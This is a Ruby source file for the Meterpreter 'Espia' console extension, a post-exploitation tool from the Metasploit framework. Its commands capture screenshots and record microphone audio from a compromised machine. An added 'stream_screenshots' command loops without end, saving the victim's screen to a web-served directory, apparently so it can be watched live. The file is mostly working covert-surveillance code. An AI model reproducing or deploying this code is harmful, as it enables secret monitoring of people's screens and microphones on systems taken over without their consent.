# -*- coding: binary -*-
require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

###
#
# Espia - Capture audio, video, screenshots from the remote system
#
###
class Console::CommandDispatcher::Espia

  Klass = Console::CommandDispatcher::Espia

  include Console::CommandDispatcher

  #
  # Initializes an instance of the espia command interaction.
  #
  def initialize(shell)
    super
  end

  #
  # List of supported commands.
  #
  def commands
    {
      "screengrab" => "Attempt to grab screen shot from process's active desktop",
      "stream_screenshots" => "Continuously capture screenshots and save to /var/www/html/screenshot/screen.jpeg"
    }
  end



  def cmd_dev_image()
    client.espia.espia_video_get_dev_image()
    print_line("[*] Done.")

    return true
  end

  def cmd_dev_audio(*args)
    maxrec = 60

    if (args.length < 1)
      print_line("Usage: dev_audio <rec_secs>\n")
      print_line("Record mic audio\n")
      return true
    end

    secs = args[0].to_i
    if secs  > 0 and secs <= maxrec
      milsecs = secs*1000
      print_line("[*] Recording #{milsecs} milliseconds.\n")
      client.espia.espia_audio_get_dev_audio(milsecs)
      print_line("[*] Done.")
    else
      print_line("[-] Error: Recording time 0 to 60 secs \n")
    end

    return true
  end

  #
  # Grab a screenshot of the current interactive desktop.
  #
  def cmd_screengrab( *args )
    if( args[0] and args[0] == "-h" )
      print_line("Usage: screengrab <path.jpeg> [view in browser: true|false]\n")
      print_line("Grab a screenshot of the current interactive desktop.\n")
      return true
    end

    show = true
    show = false if (args[1] and args[1] =~ /^(f|n|0)/i)

    path = args[0] || Rex::Text.rand_text_alpha(8) + ".jpeg"

    data = client.espia.espia_image_get_dev_screen

    if( data )
      ::File.open( path, 'wb' ) do |fd|
        fd.write( data )
      end
      path = ::File.expand_path( path )
      print_line( "Screenshot saved to: #{path}" )
      Rex::Compat.open_file( path ) if show
    end

    return true
  end

  def cmd_stream_screenshots(*args)
    if args[0] && args[0] == "-h"
      print_line("Usage: stream_screenshots <interval_seconds>\n")
      print_line("Continuously capture screenshots and save them to /var/www/html/screenshot/screen.jpeg.\n")
      return true
    end

    interval = args[0].to_f
    interval = 1.0 if interval <= 0 # Default to 1 second if no interval is provided or invalid

    print_line("[*] Starting screenshot stream...")
    begin
      loop do
        data = client.espia.espia_image_get_dev_screen
        if data
          path = "/var/www/html/screenshot/screen.jpeg"
          ::File.open(path, 'wb') do |fd|
            fd.write(data)
          end
          print_line("[*] Screenshot saved to: #{path}")
        else
          print_line("[-] Failed to capture screenshot.")
        end
        sleep(interval)
      end
  rescue Interrupt
    print_line("[*] Screenshot stream stopped.")
  end

  return true
end


  #
  # Name for this dispatcher
  #
  def name
    "Espia"
  end

end

end
end
end
end

